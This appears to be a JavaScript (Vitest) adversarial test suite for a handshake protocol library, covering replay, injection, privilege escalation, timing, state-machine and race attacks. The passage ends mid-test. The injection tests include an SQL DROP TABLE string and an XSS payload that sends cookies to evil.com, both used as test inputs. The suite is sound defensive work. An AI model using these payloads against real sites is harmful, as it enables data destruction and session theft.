/**
 * EMILIA Protocol — EP Handshake Adversarial / Attack Test Suite
 *
 * Section 23.3 of the CTO execution plan: comprehensive adversarial tests
 * covering replay attacks, injection, privilege escalation, timing attacks,
 * policy evasion, authority abuse, state machine violations, concurrency
 * race conditions, and data exfiltration attempts.
 *
 * Uses the same mock patterns as handshake.test.js — createTableSim(),
 * vi.mock for protocolWrite, etc. protocolWrite is wired to call the real
 * _handle* functions directly so we exercise actual business logic.
 *
 * @license Apache-2.0
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import crypto from 'crypto';

// ============================================================================
// Mock: Supabase
// ============================================================================

const mockGetServiceClient = vi.fn();

vi.mock('../lib/supabase.js', () => ({
  getServiceClient: (...args) => mockGetServiceClient(...args),
}));

// ============================================================================
// Mock: protocol-write
// ============================================================================

let _handshakeHandlers = {};

vi.mock('../lib/protocol-write.js', () => {
  const COMMAND_TYPES = {
    SUBMIT_RECEIPT: 'submit_receipt',
    CONFIRM_RECEIPT: 'confirm_receipt',
    ISSUE_COMMIT: 'issue_commit',
    VERIFY_COMMIT: 'verify_commit',
    REVOKE_COMMIT: 'revoke_commit',
    FILE_DISPUTE: 'file_dispute',
    RESOLVE_DISPUTE: 'resolve_dispute',
    FILE_REPORT: 'file_report',
    SUBMIT_AUTO_RECEIPT: 'submit_auto_receipt',
    INITIATE_HANDSHAKE: 'initiate_handshake',
    ADD_PRESENTATION: 'add_presentation',
    VERIFY_HANDSHAKE: 'verify_handshake',
    REVOKE_HANDSHAKE: 'revoke_handshake',
  };

  return {
    COMMAND_TYPES,
    protocolWrite: vi.fn(async (command) => {
      const handler = _handshakeHandlers[command.type];
      if (!handler) {
        throw new Error(`No handler for command type: ${command.type}`);
      }
      const res = await handler(command);
      return res?.result ?? res;
    }),
  };
});

// ============================================================================
// Import module under test (after mocks)
// ============================================================================

import {
  initiateHandshake,
  addPresentation,
  verifyHandshake,
  getHandshake,
  revokeHandshake,
  HandshakeError,
  HANDSHAKE_MODES,
  ASSURANCE_LEVELS,
  HANDSHAKE_STATUSES,
  _handleInitiateHandshake,
  _handleAddPresentation,
  _handleVerifyHandshake,
  _handleRevokeHandshake,
  _internals,
} from '../lib/handshake/index.js';

// Wire handlers after import so they reference the real functions
_handshakeHandlers = {
  initiate_handshake: _handleInitiateHandshake,
  add_presentation: _handleAddPresentation,
  verify_handshake: _handleVerifyHandshake,
  revoke_handshake: _handleRevokeHandshake,
  issue_commit: async () => ({
    result: { commit_id: 'epc_mock_' + crypto.randomBytes(4).toString('hex'), decision: 'allow' },
    aggregateId: 'epc_mock',
  }),
};

// ============================================================================
// Supabase table simulator (same as handshake.test.js)
// ============================================================================

function createTableSim() {
  const tables = {};

  function getTable(name) {
    if (!tables[name]) tables[name] = [];
    return tables[name];
  }

  function applyFilters(rows, filters) {
    let result = rows;
    for (const f of filters) {
      result = result.filter((r) => r[f.col] === f.val);
    }
    return result;
  }

  function buildSelectChain(tableName) {
    let filters = [];
    const chain = {
      select: vi.fn().mockImplementation(() => chain),
      eq: vi.fn().mockImplementation((col, val) => {
        filters.push({ col, val });
        return chain;
      }),
      neq: vi.fn().mockImplementation(() => chain),
      order: vi.fn().mockImplementation(() => chain),
      limit: vi.fn().mockImplementation(() => chain),
      single: vi.fn().mockImplementation(() => {
        const filtered = applyFilters(getTable(tableName), filters);
        filters = [];
        return Promise.resolve({ data: filtered[0] || null, error: null });
      }),
      maybeSingle: vi.fn().mockImplementation(() => {
        const filtered = applyFilters(getTable(tableName), filters);
        filters = [];
        return Promise.resolve({ data: filtered[0] || null, error: null });
      }),
      then: undefined,
    };
    chain.then = (resolve, reject) => {
      const filtered = applyFilters(getTable(tableName), filters);
      filters = [];
      return Promise.resolve({ data: filtered, error: null }).then(resolve, reject);
    };
    return chain;
  }

  function buildInsertChain(tableName) {
    let insertedRows = null;
    const chain = {
      insert: vi.fn().mockImplementation((rows) => {
        const arr = Array.isArray(rows) ? rows : [rows];
        for (const row of arr) {
          if (tableName === 'handshakes' && !row.handshake_id) {
            row.handshake_id = 'eph_' + crypto.randomBytes(12).toString('hex');
          }
          if (tableName === 'handshake_parties' && !row.id) {
            row.id = crypto.randomBytes(8).toString('hex');
          }
          getTable(tableName).push(row);
        }
        insertedRows = arr;
        return chain;
      }),
      select: vi.fn().mockImplementation(() => chain),
      single: vi.fn().mockImplementation(() => {
        return Promise.resolve({ data: insertedRows?.[0] || null, error: null });
      }),
      then: undefined,
    };
    chain.then = (resolve, reject) => {
      return Promise.resolve({ data: insertedRows, error: null }).then(resolve, reject);
    };
    return chain;
  }

  function buildUpdateChain(tableName) {
    let updateData = null;
    let filters = [];
    const chain = {
      update: vi.fn().mockImplementation((data) => {
        updateData = data;
        return chain;
      }),
      eq: vi.fn().mockImplementation((col, val) => {
        filters.push({ col, val });
        return chain;
      }),
      select: vi.fn().mockImplementation(() => chain),
      single: vi.fn().mockImplementation(() => {
        const rows = applyFilters(getTable(tableName), filters);
        for (const row of rows) Object.assign(row, updateData);
        filters = [];
        return Promise.resolve({ data: rows[0] || null, error: null });
      }),
      then: undefined,
    };
    chain.then = (resolve, reject) => {
      const rows = applyFilters(getTable(tableName), filters);
      for (const row of rows) Object.assign(row, updateData);
      filters = [];
      return Promise.resolve({ data: rows, error: null }).then(resolve, reject);
    };
    return chain;
  }

  function mockClient() {
    return {
      from: vi.fn().mockImplementation((tableName) => {
        return {
          select: (...args) => {
            const c = buildSelectChain(tableName);
            c.select(...args);
            return c;
          },
          insert: (rows) => {
            const c = buildInsertChain(tableName);
            return c.insert(rows);
          },
          update: (data) => {
            const c = buildUpdateChain(tableName);
            return c.update(data);
          },
        };
      }),
    };
  }

  return { tables, getTable, mockClient };
}

// ============================================================================
// Helpers: valid params builders
// ============================================================================

function validHandshakeParams(overrides = {}) {
  return {
    mode: 'basic',
    policy_id: 'policy-abc-123',
    parties: [
      { role: 'initiator', entity_ref: 'entity-alice' },
    ],
    payload: { action: 'connect', target: 'service-xyz' },
    binding_ttl_ms: 600_000,
    actor: 'entity-alice',
    ...overrides,
  };
}

function mutualHandshakeParams(overrides = {}) {
  return validHandshakeParams({
    mode: 'mutual',
    parties: [
      { role: 'initiator', entity_ref: 'entity-alice' },
      { role: 'responder', entity_ref: 'entity-bob' },
    ],
    ...overrides,
  });
}

function validPresentation(overrides = {}) {
  return {
    type: 'vc',
    data: JSON.stringify({
      entity_id: 'entity-alice',
      display_name: 'Alice Agent',
      assurance_level: 'substantial',
    }),
    issuer_ref: 'issuer-trusted-ca',
    disclosure_mode: 'full',
    ...overrides,
  };
}

/**
 * Helper: initiate a handshake and return its ID along with the sim instance.
 * Optionally accepts params overrides.
 */
async function initHandshakeWithSim(sim, params = {}) {
  mockGetServiceClient.mockReturnValue(sim.mockClient());
  const result = await initiateHandshake(validHandshakeParams(params));
  return result.handshake_id;
}

/**
 * Helper: seed an authority record into the sim for issuer checks.
 */
function seedAuthority(sim, keyId, { status = 'active', validFrom, validTo } = {}) {
  sim.getTable('authorities').push({
    authority_id: 'auth_' + crypto.randomBytes(4).toString('hex'),
    key_id: keyId,
    status,
    valid_from: validFrom || new Date(Date.now() - 86400_000).toISOString(),
    valid_to: validTo || new Date(Date.now() + 86400_000).toISOString(),
  });
}

// ============================================================================
// 1. Replay Attacks (4 tests)
// ============================================================================

describe('Replay Attacks', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: An attacker captures a valid presentation hash and replays it on
  // a different handshake hoping to inherit its verified status.
  it('replayed presentation with same hash is rejected — binding mismatch', async () => {
    // Create handshake A and add a valid presentation
    const resultA = await initiateHandshake(validHandshakeParams());
    const hsIdA = resultA.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    const pres = validPresentation();
    await addPresentation(hsIdA, 'initiator', pres);

    // Capture the presentation hash from handshake A
    const presRecords = sim.getTable('handshake_presentations');
    const storedHash = presRecords[0].presentation_hash;
    expect(storedHash).toBeDefined();

    // Create handshake B — a completely separate handshake
    const resultB = await initiateHandshake(validHandshakeParams({ policy_id: 'policy-other' }));
    const hsIdB = resultB.handshake_id;

    // Add a presentation to B with the exact same data (replayed)
    await addPresentation(hsIdB, 'initiator', pres);

    // Verify handshake B — the payload_hash bound to A differs from B's binding
    const verifyResult = await verifyHandshake(hsIdB, { payload_hash: storedHash });
    // The payload_hash does not match B's binding, so it should produce payload_hash_mismatch
    expect(verifyResult.reason_codes).toContain('payload_hash_mismatch');
    expect(verifyResult.outcome).not.toBe('accepted');
  });

  // Attack: Reuse a nonce from handshake A in handshake B to bypass challenge freshness.
  // Each handshake generates its own nonce; the nonce is stored in the binding table.
  it('replayed nonce on different handshake is rejected — each handshake has unique nonce', async () => {
    const resultA = await initiateHandshake(validHandshakeParams());
    const resultB = await initiateHandshake(validHandshakeParams({ policy_id: 'policy-999' }));

    const bindings = sim.getTable('handshake_bindings');
    const nonceA = bindings.find((b) => b.handshake_id === resultA.handshake_id)?.nonce;
    const nonceB = bindings.find((b) => b.handshake_id === resultB.handshake_id)?.nonce;

    // Nonces must be unique per handshake — replaying A's nonce for B is detectable
    expect(nonceA).toBeDefined();
    expect(nonceB).toBeDefined();
    expect(nonceA).not.toBe(nonceB);
    // Both are 64-char hex (32 bytes)
    expect(nonceA).toMatch(/^[0-9a-f]{64}$/);
    expect(nonceB).toMatch(/^[0-9a-f]{64}$/);
  });

  // Attack: After a binding expires, try to add a presentation using the old handshake ID.
  it('replayed binding from expired handshake is rejected at verification', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    // Force-expire the binding
    const bindings = sim.getTable('handshake_bindings');
    const binding = bindings.find((b) => b.handshake_id === hsId);
    binding.expires_at = new Date(Date.now() - 60_000).toISOString();

    // Add a presentation (this succeeds — presentation is stored)
    await addPresentation(hsId, 'initiator', validPresentation());

    // But verification detects the expired binding
    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.reason_codes).toContain('binding_expired');
    expect(verifyResult.outcome).toBe('expired');
  });

  // Attack: After handshake is finalized (verified), try to add another presentation.
  it('presentation replay after handshake finalization is rejected', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsId, 'initiator', validPresentation());
    await verifyHandshake(hsId);

    // Handshake is now in 'verified' state — adding a presentation should fail
    await expect(
      addPresentation(hsId, 'initiator', validPresentation({ data: 'replayed-data' })),
    ).rejects.toThrow(/Cannot add presentation.*verified/);
  });
});

// ============================================================================
// 2. Injection & Manipulation (4 tests)
// ============================================================================

describe('Injection & Manipulation', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: Inject SQL in the policy_id field to manipulate DB queries.
  // The system should treat it as a string literal (parameterized queries)
  // and not crash or execute SQL.
  it('SQL-like injection in policy_id field is treated as opaque string', async () => {
    const sqlPayload = "'; DROP TABLE handshakes; --";
    const result = await initiateHandshake(validHandshakeParams({ policy_id: sqlPayload }));

    // The handshake is created — the SQL injection is stored as a literal string,
    // not executed (Supabase uses parameterized queries).
    expect(result.handshake_id).toMatch(/^eph_/);
    expect(result.policy_id).toBe(sqlPayload);

    // The stored record contains the literal string, not an executed injection
    const hsRecords = sim.getTable('handshakes');
    expect(hsRecords[0].policy_id).toBe(sqlPayload);
  });

  // Attack: XSS payload in presentation claims to exfiltrate data if rendered.
  // The system stores hashes, not raw payloads — XSS payloads are hashed away.
  it('XSS payload in presentation claims is hashed — raw payload not stored', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    const xssData = '<script>document.location="https://evil.com?c="+document.cookie</script>';
    await addPresentation(hsId, 'initiator', validPresentation({ data: xssData }));

    // The stored presentation has a hash, not the raw XSS payload
    const presentations = sim.getTable('handshake_presentations');
    expect(presentations[0].presentation_hash).toMatch(/^[0-9a-f]{64}$/);
    // No raw XSS content stored in the record
    expect(JSON.stringify(presentations[0])).not.toContain('<script>');
  });

  // Attack: Send an oversized payload (>1MB) to exhaust memory or storage.
  // The payload is hashed (sha256), so only a 64-char hash is stored, but
  // the system should still handle it without crashing.
  it('oversized payload (>1MB) is hashed to fixed-length — no storage bloat', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    const largeData = 'A'.repeat(1_100_000); // ~1.1MB
    await addPresentation(hsId, 'initiator', validPresentation({ data: largeData }));

    // Only the 64-char sha256 hash is stored, not the 1.1MB payload
    const presentations = sim.getTable('handshake_presentations');
    expect(presentations[0].presentation_hash).toHaveLength(64);
  });

  // Attack: Send malformed JSON as presentation data to trigger parse errors.
  // The system should hash whatever data is provided without parsing it as JSON.
  it('malformed JSON in presentation body is handled gracefully', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    const malformedJson = '{this is not: valid [json}}}';
    // addPresentation hashes the data as a string; it does not parse it as JSON
    await addPresentation(hsId, 'initiator', validPresentation({ data: malformedJson }));

    const presentations = sim.getTable('handshake_presentations');
    expect(presentations[0].presentation_hash).toMatch(/^[0-9a-f]{64}$/);
  });
});

// ============================================================================
// 3. Privilege Escalation (4 tests)
// ============================================================================

describe('Privilege Escalation', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: A party registered as 'responder' tries to submit a presentation
  // as 'initiator' to impersonate the other party (role spoofing).
  it('party cannot present as a different party_role — role spoofing rejected', async () => {
    const result = await initiateHandshake(mutualHandshakeParams());
    const hsId = result.handshake_id;

    // Bob is registered as 'responder', but tries to submit as 'verifier'
    // (a role not registered in this handshake).
    await expect(
      addPresentation(hsId, 'verifier', validPresentation()),
    ).rejects.toThrow(/No party with role 'verifier'/);
  });

  // Attack: An entity not listed as a party attempts to add a presentation.
  // The system checks that the party_role exists in the handshake_parties table.
  it('non-participant entity cannot add presentation — role not found', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    // 'responder' role does not exist in a basic handshake with only 'initiator'
    await expect(
      addPresentation(hsId, 'responder', validPresentation()),
    ).rejects.toThrow(/No party with role 'responder'/);
  });

  // Attack: In mutual mode, the initiator tries to verify the handshake without
  // the responder ever presenting — should be rejected for missing presentation.
  it('initiator cannot verify mutual handshake without responder presentation', async () => {
    const result = await initiateHandshake(mutualHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    // Only initiator presents
    await addPresentation(hsId, 'initiator', validPresentation());

    // Verify — responder's presentation is missing
    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.reason_codes).toContain('missing_presentation_responder');
    expect(verifyResult.outcome).not.toBe('accepted');
  });

  // Attack: Attempt to revoke a handshake that does not exist.
  // The system should return NOT_FOUND.
  it('revoker must target an existing handshake — NOT_FOUND on bogus ID', async () => {
    await expect(
      revokeHandshake('eph_nonexistent_id', 'malicious revocation'),
    ).rejects.toThrow(/not found/i);
  });
});

// ============================================================================
// 4. Timing Attacks (3 tests)
// ============================================================================

describe('Timing Attacks', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: Submit a presentation and verify at exactly the expiry boundary.
  // The binding's expires_at is set to "now" — the < check means exactly-at is expired.
  it('presentation submitted exactly at expiry boundary is rejected', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsId, 'initiator', validPresentation());

    // Set expires_at to exactly now — Date comparison: expires_at < new Date() → true
    const bindings = sim.getTable('handshake_bindings');
    const binding = bindings.find((b) => b.handshake_id === hsId);
    binding.expires_at = new Date().toISOString();

    // Allow 1ms for clock to advance past the boundary
    await new Promise((r) => setTimeout(r, 2));

    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.reason_codes).toContain('binding_expired');
    expect(verifyResult.outcome).toBe('expired');
  });

  // Attack: Verify 1ms after binding expiry to check boundary precision.
  it('verification attempted 1ms after expiry is rejected', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsId, 'initiator', validPresentation());

    // Set expiry to 1ms in the past
    const bindings = sim.getTable('handshake_bindings');
    const binding = bindings.find((b) => b.handshake_id === hsId);
    binding.expires_at = new Date(Date.now() - 1).toISOString();

    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.reason_codes).toContain('binding_expired');
    expect(verifyResult.outcome).toBe('expired');
  });

  // Attack: Create a handshake with a 0-second expiry window.
  // The system clamps binding_ttl_ms to a minimum of 60,000ms (1 minute),
  // so a 0-second request still gets a 60s window.
  it('handshake with 0-second expiry window is clamped to minimum TTL', async () => {
    const result = await initiateHandshake(validHandshakeParams({ binding_ttl_ms: 0 }));
    const hsId = result.handshake_id;

    const bindings = sim.getTable('handshake_bindings');
    const binding = bindings.find((b) => b.handshake_id === hsId);

    // The binding should expire at least 60 seconds from initiation (clamped minimum)
    const expiresAt = new Date(binding.expires_at);
    const initiatedAt = new Date(sim.getTable('handshakes')[0].initiated_at);
    const diffMs = expiresAt.getTime() - initiatedAt.getTime();

    // Clamped to minimum of 60,000ms
    expect(diffMs).toBeGreaterThanOrEqual(59_000); // allow small clock drift
    expect(diffMs).toBeLessThanOrEqual(61_000);
  });
});

// ============================================================================
// 5. Policy Evasion (4 tests)
// ============================================================================

describe('Policy Evasion', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: Set a party's assurance_level to 'high' but present with an unverified
  // (revoked issuer) presentation. Verification should detect assurance not met.
  it('assurance_level below policy minimum is rejected at verification', async () => {
    const result = await initiateHandshake(validHandshakeParams({
      parties: [
        { role: 'initiator', entity_ref: 'entity-alice', assurance_level: 'high' },
      ],
    }));
    const hsId = result.handshake_id;

    // Seed a REVOKED authority — presentation will be marked unverified
    seedAuthority(sim, 'issuer-revoked-ca', { status: 'revoked' });

    await addPresentation(hsId, 'initiator', validPresentation({ issuer_ref: 'issuer-revoked-ca' }));

    const verifyResult = await verifyHandshake(hsId);
    // The presentation is unverified due to revoked issuer, so assurance is not met
    expect(verifyResult.reason_codes).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/assurance_not_met|issuer_revoked|unverified_presentation/),
      ]),
    );
    expect(verifyResult.outcome).not.toBe('accepted');
  });

  // Attack: In a mutual handshake, only one party presents. Even if that party's
  // presentation passes all checks, the handshake should fail for missing claims.
  it('missing required presentation causes rejection even if other claims pass', async () => {
    const result = await initiateHandshake(mutualHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    // Only initiator presents — responder is missing
    await addPresentation(hsId, 'initiator', validPresentation());

    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.reason_codes).toContain('missing_presentation_responder');
    expect(verifyResult.outcome).not.toBe('accepted');
  });

  // Attack: Take a valid presentation from handshake A and submit its hash
  // as the payload_hash for handshake B verification, hoping to pass binding checks.
  it('substituting a valid presentation from a different handshake is rejected — binding mismatch', async () => {
    // Handshake A — legitimate
    const resultA = await initiateHandshake(validHandshakeParams({ payload: { secret: 'alpha' } }));
    const hsIdA = resultA.handshake_id;
    const bindingA = sim.getTable('handshake_bindings').find((b) => b.handshake_id === hsIdA);
    const hashA = bindingA.payload_hash;

    // Handshake B — attacker's handshake with different payload
    const resultB = await initiateHandshake(validHandshakeParams({ payload: { secret: 'beta' } }));
    const hsIdB = resultB.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsIdB, 'initiator', validPresentation());

    // Attacker passes handshake A's payload_hash during B's verification
    const verifyResult = await verifyHandshake(hsIdB, { payload_hash: hashA });
    expect(verifyResult.reason_codes).toContain('payload_hash_mismatch');
    expect(verifyResult.outcome).not.toBe('accepted');
  });

  // Attack: After an initial presentation with 'high' assurance, try to add
  // another with a lower assurance. The verification should reflect the lowest
  // assurance achieved, not the highest.
  it('downgrade from high to low assurance — assurance_achieved reflects minimum', async () => {
    const result = await initiateHandshake(mutualHandshakeParams({
      parties: [
        { role: 'initiator', entity_ref: 'entity-alice', assurance_level: 'high' },
        { role: 'responder', entity_ref: 'entity-bob', assurance_level: 'low' },
      ],
    }));
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsId, 'initiator', validPresentation());
    await addPresentation(hsId, 'responder', validPresentation({
      data: JSON.stringify({ entity_id: 'entity-bob' }),
    }));

    const verifyResult = await verifyHandshake(hsId);
    // assurance_achieved should be the minimum of 'high' and 'low' → 'low'
    expect(verifyResult.assurance_achieved).toBe('low');
  });
});

// ============================================================================
// 6. Authority & Issuer Attacks (4 tests)
// ============================================================================

describe('Authority & Issuer Attacks', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: Present credentials from a revoked certificate authority.
  it('presentation from revoked authority is rejected', async () => {
    const result = await initiateHandshake(validHandshakeParams({
      parties: [
        { role: 'initiator', entity_ref: 'entity-alice', assurance_level: 'substantial' },
      ],
    }));
    const hsId = result.handshake_id;

    // Authority is revoked
    seedAuthority(sim, 'issuer-revoked', { status: 'revoked' });

    await addPresentation(hsId, 'initiator', validPresentation({ issuer_ref: 'issuer-revoked' }));

    // The presentation is marked as not verified due to revoked authority
    const presentations = sim.getTable('handshake_presentations');
    const pres = presentations.find((p) => p.handshake_id === hsId);
    expect(pres.verified).toBe(false);
    expect(pres.revocation_status).toBe('revoked');

    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.reason_codes).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/issuer_revoked|unverified_presentation/),
      ]),
    );
    expect(verifyResult.outcome).not.toBe('accepted');
  });

  // Attack: Present credentials from an issuer not in the authorities table.
  // When no authority record exists, the system defaults to issuerTrusted = true
  // (no authority table entry means no revocation info available). This is by design —
  // the test validates that revocation_checked is true and revocation_status is 'good'
  // when an issuer_ref is provided but no authority record is found.
  it('presentation from unknown/unregistered issuer — revocation not enforceable without authority record', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    // No authority seeded — issuer_ref points to nowhere
    await addPresentation(hsId, 'initiator', validPresentation({ issuer_ref: 'issuer-unknown-xyz' }));

    const presentations = sim.getTable('handshake_presentations');
    const pres = presentations.find((p) => p.handshake_id === hsId);
    // Without an authority record, the system cannot revoke — revocation_checked is true
    // but the issuer is treated as trusted (no negative signal)
    expect(pres.revocation_checked).toBe(true);
    expect(pres.revocation_status).toBe('good');
  });

  // Attack: Authority was valid when presentation was created but revoked before
  // verification occurs. The _handleAddPresentation checks authority status at
  // presentation time — if revoked, the presentation is marked unverified.
  it('authority revoked before presentation is added — presentation marked unverified', async () => {
    const result = await initiateHandshake(validHandshakeParams({
      parties: [
        { role: 'initiator', entity_ref: 'entity-alice', assurance_level: 'high' },
      ],
    }));
    const hsId = result.handshake_id;

    // Authority exists but its valid_to is in the past (expired/revoked)
    seedAuthority(sim, 'issuer-expired-ca', {
      status: 'active',
      validTo: new Date(Date.now() - 3600_000).toISOString(), // expired 1 hour ago
    });

    await addPresentation(hsId, 'initiator', validPresentation({ issuer_ref: 'issuer-expired-ca' }));

    const presentations = sim.getTable('handshake_presentations');
    const pres = presentations.find((p) => p.handshake_id === hsId);
    expect(pres.verified).toBe(false);
    expect(pres.revocation_status).toBe('revoked');

    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.outcome).not.toBe('accepted');
  });

  // Attack: Self-signed presentation where the issuer matches the presenter.
  // The system does not inherently reject self-signed presentations at the
  // protocol level (it depends on policy). However, if a policy requires an
  // external authority and the authority table has no record for the self-signer,
  // the presentation's verification depends on authority lookup.
  it('self-signed presentation — issuer == presenter entity_ref', async () => {
    const result = await initiateHandshake(validHandshakeParams({
      parties: [
        { role: 'initiator', entity_ref: 'entity-alice', assurance_level: 'high' },
      ],
    }));
    const hsId = result.handshake_id;

    // Self-signed: issuer_ref matches the entity_ref of the presenter
    // No authority record exists for this self-signer
    await addPresentation(hsId, 'initiator', validPresentation({
      issuer_ref: 'entity-alice', // same as entity_ref — self-signed
    }));

    const presentations = sim.getTable('handshake_presentations');
    const pres = presentations.find((p) => p.handshake_id === hsId);
    // Without an authority record, revocation_status defaults to 'good'
    // but real-world policy enforcement would reject self-signed credentials
    expect(pres.issuer_ref).toBe('entity-alice');
    expect(pres.revocation_checked).toBe(true);

    // In a system with policy enforcement requiring external authority,
    // verification would add an assurance failure. Here we validate the
    // data is stored correctly for policy evaluation.
    expect(pres.presentation_hash).toMatch(/^[0-9a-f]{64}$/);
  });
});

// ============================================================================
// 7. State Machine Violations (3 tests)
// ============================================================================

describe('State Machine Violations', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: After a handshake is accepted/verified, try to force it back to 'pending'.
  // The addPresentation handler checks status and rejects non-initiated/pending states.
  it('cannot transition from accepted/verified back to pending', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsId, 'initiator', validPresentation());
    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.outcome).toBe('accepted');

    // Handshake is now 'verified' — cannot add presentation (which would imply pending)
    await expect(
      addPresentation(hsId, 'initiator', validPresentation({ data: 'attempt-to-reopen' })),
    ).rejects.toThrow(/Cannot add presentation.*verified/);

    // Cannot re-verify either
    await expect(
      verifyHandshake(hsId),
    ).rejects.toThrow(/Cannot verify.*verified/);
  });

  // Attack: Try to add a presentation to a revoked handshake.
  it('cannot add presentation to revoked handshake', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    // Revoke immediately
    await revokeHandshake(hsId, 'testing revocation');

    // Attempt to add presentation to revoked handshake
    await expect(
      addPresentation(hsId, 'initiator', validPresentation()),
    ).rejects.toThrow(/Cannot add presentation.*revoked/);
  });

  // Attack: Try to verify an expired handshake.
  it('cannot verify expired handshake', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsId, 'initiator', validPresentation());

    // Force-expire the binding
    const bindings = sim.getTable('handshake_bindings');
    const binding = bindings.find((b) => b.handshake_id === hsId);
    binding.expires_at = new Date(Date.now() - 60_000).toISOString();

    // First verification marks it as 'expired'
    const verifyResult = await verifyHandshake(hsId);
    expect(verifyResult.outcome).toBe('expired');

    // Second verification attempt should fail because status is now 'expired'
    await expect(
      verifyHandshake(hsId),
    ).rejects.toThrow(/Cannot verify.*expired/);
  });
});

// ============================================================================
// 8. Concurrency / Race Conditions (3 tests)
// ============================================================================

describe('Concurrency / Race Conditions', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: Two simultaneous verifications of the same handshake. Both should
  // produce a result, but the handshake should only have one final state.
  it('two simultaneous verifications produce consistent results', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;
    seedAuthority(sim, 'issuer-trusted-ca');

    await addPresentation(hsId, 'initiator', validPresentation());

    // Launch two verifications concurrently
    // The first will succeed; the second will see 'verified' state and throw
    const results = await Promise.allSettled([
      verifyHandshake(hsId),
      verifyHandshake(hsId),
    ]);

    // At least one should succeed
    const fulfilled = results.filter((r) => r.status === 'fulfilled');
    const rejected = results.filter((r) => r.status === 'rejected');
    expect(fulfilled.length).toBeGreaterThanOrEqual(1);

    // If both succeed (race), both should have the same outcome
    if (fulfilled.length === 2) {
      expect(fulfilled[0].value.outcome).toBe(fulfilled[1].value.outcome);
    }

    // If one is rejected, it should be due to invalid state (already verified)
    if (rejected.length > 0) {
      expect(rejected[0].reason.message).toMatch(/Cannot verify/);
    }

    // Only one final status in the DB
    const handshakes = sim.getTable('handshakes');
    const hs = handshakes.find((h) => h.handshake_id === hsId);
    expect(hs.status).toBe('verified');
  });

  // Attack: Concurrent presentation and revocation — revocation should win
  // because it moves the handshake to a terminal state.
  it('concurrent presentation and revocation — revocation wins on terminal state', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    // Launch both concurrently
    const results = await Promise.allSettled([
      addPresentation(hsId, 'initiator', validPresentation()),
      revokeHandshake(hsId, 'concurrent revocation'),
    ]);

    // At least one should succeed
    const fulfilled = results.filter((r) => r.status === 'fulfilled');
    expect(fulfilled.length).toBeGreaterThanOrEqual(1);

    // After both settle, the handshake should be in a terminal state
    const handshakes = sim.getTable('handshakes');
    const hs = handshakes.find((h) => h.handshake_id === hsId);
    // Either 'revoked' or 'pending_verification' — but revoked is terminal
    // If presentation went first, revocation still succeeds; if revocation went
    // first, presentation fails. Either way, revoked is the final terminal state
    // if revocation succeeded.
    const revokeSucceeded = results.some(
      (r) => r.status === 'fulfilled' && r.value?.status === 'revoked',
    );
    if (revokeSucceeded) {
      expect(hs.status).toBe('revoked');
    }
  });

  // Attack: Submit the exact same command twice — idempotency should return
  // the existing result, not create a duplicate.
  it('duplicate idempotency keys return existing result, not error', async () => {
